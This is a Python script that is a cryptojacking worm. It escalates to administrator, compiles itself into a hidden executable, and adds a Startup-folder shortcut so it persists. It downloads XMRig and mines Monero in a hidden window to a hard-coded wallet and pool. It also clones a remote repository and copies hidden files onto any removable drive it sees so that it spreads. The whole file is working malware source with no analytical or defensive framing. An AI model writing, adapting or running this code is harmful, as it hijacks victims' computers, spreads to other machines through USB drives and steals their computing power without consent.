import os
import shutil
import subprocess
import platform
import requests
import zipfile
import tarfile
import ctypes
import sys
import time
import psutil
import threading
import random
import win32com.client  # For creating shortcuts on Windows

# Relevant paths
binary_folder = r"C:\ProgramData\binaries"  # Path for the compiled binary
program_data_folder = r"C:\ProgramData"  # Path for the program data folder
startup_folder = r"C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"  # For Windows only
repo_folder = os.path.join(program_data_folder, "my_repository")  # Path where the repo will be downloaded

# GitHub Repository URL (using .git)
github_repo_url = 'https://github.com/jorge4684/initial_files.git'  # Replace with your repo's .git URL

# File names
binary_name = "m3tta.exe"
binary_path = os.path.join(binary_folder, binary_name)
shortcut_path = os.path.join(binary_folder, f"{binary_name}.lnk")
startup_shortcut_path = os.path.join(startup_folder, f"{binary_name}.lnk")

# Function to check if the script is running as administrator (Windows-specific)
def is_admin():
    try:
        if os.name == 'nt':  # Windows
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        return False  # On non-Windows platforms, admin check may not be needed
    except Exception:
        return False

# Function to run the script as administrator (Windows only)
def run_as_admin():
    if os.name == 'nt':  # Windows
        if not is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable.replace("python.exe", "pythonw.exe"), __file__, None, 1)

# Function to create a shortcut (Windows only)
def create_shortcut(target, shortcut_path):
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortcut(shortcut_path)
    shortcut.TargetPath = target
    shortcut.WorkingDirectory = binary_folder  # Set working directory explicitly
    shortcut.Save()

# Function to copy the shortcut to the startup folder with elevated privileges (Windows only)
def copy_shortcut_to_startup():
    if not os.path.exists(startup_shortcut_path):
        if not is_admin():
            run_as_admin()
            return
        shutil.copy(shortcut_path, startup_folder)

# Function to check if the drive is removable (cross-platform)
def is_removable_drive(drive):
    try:
        if os.name == 'nt':  # Windows
            import win32file
            import win32con
            drive_type = win32file.GetDriveType(drive)
            return drive_type == win32con.DRIVE_REMOVABLE
        else:  # For Linux/macOS
            partitions = psutil.disk_partitions()
            for partition in partitions:
                if 'removable' in partition.opts:
                    return partition.device == drive
            return False
    except Exception as e:
        return False

def clone_repo():
    if not os.path.exists(repo_folder):
        os.makedirs(repo_folder)

    try:
        # Clone the repository using git
        subprocess.run(['git', 'clone', github_repo_url, repo_folder], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"Repository cloned successfully to {repo_folder}")

        # The cloned folder name will be the same as the repo name, e.g., 'initial_files'
        # Adjust this path if necessary based on the actual folder structure
        extracted_folder = os.path.join(repo_folder, 'initial_files')  # Adjust based on your repository structure
        return extracted_folder

    except subprocess.CalledProcessError as e:
        print(f"Error cloning the repository: {e}")
        return None

# Function to copy the contents of the cloned repository to the root of a connected drive
def copy_repo_to_drive(drive, repo_folder):
    try:
        # Ensure repo folder exists
        if not os.path.exists(repo_folder):
            print("Repository folder not found.")
            return

        # Copy files from the repo folder to the root of the connected drive
        for item in os.listdir(repo_folder):
            item_path = os.path.join(repo_folder, item)
            destination_path = os.path.join(drive, item)

            if os.path.isdir(item_path):
                shutil.copytree(item_path, destination_path)
            else:
                shutil.copy(item_path, destination_path)

        # Hide the copied files and directories on Windows
        if os.name == 'nt':
            for item in os.listdir(drive):
                item_path = os.path.join(drive, item)
                if os.path.isfile(item_path):
                    os.system(f'attrib +h "{item_path}"')
                elif os.path.isdir(item_path):
                    os.system(f'attrib +h "{item_path}"')
    except Exception as e:
        print(f"Error copying repository files to drive {drive}: {e}")

# Function to download and extract XMRig based on platform (cross-platform)
def download_xmrig():
    system = platform.system()
    arch = platform.architecture()[0]

    if system == 'Linux':
        if arch == '64bit':
            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz'
        else:
            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-arm.tar.gz'
    elif system == 'Windows':
        if arch == '64bit':
            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-msvc-win64.zip'
        else:
            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-msvc-win32.zip'
    elif system == 'Darwin':  # macOS
        if arch == '64bit':
            xmrig_url = 'https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-macos-x64.tar.gz'
        else:
            raise Exception("32-bit macOS is not supported.")
    else:
        raise Exception("Unsupported operating system.")

    xmrig_filename = 'xmrig_downloaded'

    # Download the xmrig binary
    try:
        response = requests.get(xmrig_url)
        response.raise_for_status()  # Check if download was successful
        with open(xmrig_filename, 'wb') as file:
            file.write(response.content)
    except requests.exceptions.RequestException as e:
        print(f"Error downloading XMRig: {e}")  # Log the error
        return

    # Extract the binary
    try:
        if xmrig_url.endswith('.zip'):
            with zipfile.ZipFile(xmrig_filename, 'r') as zip_ref:
                zip_ref.extractall(binary_folder)

            os.remove(xmrig_filename)  # Remove the downloaded file after extraction
        elif xmrig_url.endswith('.tar.gz'):
            with tarfile.open(xmrig_filename, 'r:gz') as tar_ref:
                tar_ref.extractall(binary_folder)

            os.remove(xmrig_filename)  # Remove the downloaded file after extraction
    except zipfile.BadZipFile as e:
        print(f"Error extracting XMRig: {e}")  # Log the error

def generate_worker_name():
    # Generate a random number between 1 and 100
    random_number = random.randint(1, 10000)
    return f"worker_{random_number}"

# Function to start mining (cross-platform)
def start_mining():
    try:
        # Path to the xmrig binary
        xmrig_path = os.path.join(binary_folder, 'xmrig-6.16.4', 'xmrig.exe')  # Adjust path for Windows
        if os.name != 'nt':  # Linux/macOS path adjustment
            xmrig_path = os.path.join(binary_folder, 'xmrig')

        if not os.path.exists(xmrig_path):
            print("XMRig binary not found.")  # Log the error
            return

        # Command to start mining
        worker_name = generate_worker_name()
        command = [
            xmrig_path,
            '--url=pool.supportxmr.com:3333',  # Replace with your mining pool URL
            '--user=48HjwbWwoh8aRND6GeqevBAko9pvgUACxiRC8XH3iDbS1KjvKnJnunjKCrW7t46oEW4w4CBAVCP96WobThPFRhzL7Q2Qwse',  # Replace with your Monero wallet address
            '--pass=x',  # Replace with your mining pool password
            '--coin=monero',
            '--worker=' + worker_name  # Set the generated worker name
        ]

        # Start the mining process without opening a console window
        process = subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        monitor_mining_output(process)  # Monitor the mining output
    except Exception as e:
        print(f"Error starting mining: {e}")  # Log the error

# Function to monitor mining output (cross-platform)
def monitor_mining_output(process):
    try:
        stdout, stderr = process.communicate()
        if stdout:
            print(stdout.decode())  # Log the output
        if stderr:
            print(stderr.decode())  # Log the errors
    except Exception as e:
        print(f"Error monitoring mining output: {e}")  # Log the error

# Function to monitor and copy binaries folder to removable drives (cross-platform)
def monitor_and_copy_binaries():
    while True:
        try:
            drives = [drive for drive in psutil.disk_partitions() if 'removable' in drive.opts]
            if not drives:
                time.sleep(10)
            for drive in drives:
                if is_removable_drive(drive.device):
                    copy_repo_to_drive(drive.device, repo_folder)
            time.sleep(10)  # Wait for 10 seconds before checking again
        except Exception as e:
            print(f"Error monitoring and copying binaries: {e}")  # Log the error
            time.sleep(5)  # Retry after 5 seconds

# Function to create the binary using PyInstaller
def create_binary():
    """Create the binary using PyInstaller."""
    if not os.path.exists(binary_path):
        # Suppress console output during binary creation
        subprocess.run(
            [
                sys.executable,
                "-m", "PyInstaller",
                "--onefile",
                "--distpath", binary_folder,
                "--workpath", os.path.join(binary_folder, "build"),
                "--specpath", os.path.join(binary_folder, "specs"),
                "--noconsole",  # This option suppresses the console window
                os.path.abspath(__file__)
            ],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )

# Main function
def main():
    # Create the binary if it doesn't exist
    create_binary()

    # Create a shortcut to the binary
    create_shortcut(binary_path, shortcut_path)

    # Copy the shortcut to the startup folder with elevated privileges
    copy_shortcut_to_startup()

    # Start mining
    start_mining()

    # Download XMRig
    download_xmrig()

    repo_folder_path = clone_repo()

    if repo_folder_path:
        print(f"Repository successfully cloned to {repo_folder_path}")
        # You can now process the repo or copy its contents as needed
        # Example: copy_repo_to_drive(drive.device, repo_folder_path)

    # Start monitoring system resources in a separate thread
    threading.Thread(target=monitor_and_copy_binaries, daemon=True).start()

    # Keep the script running silently
    while True:
        time.sleep(1)  # Just keep it alive (blocking)

if __name__ == "__main__":
    main()















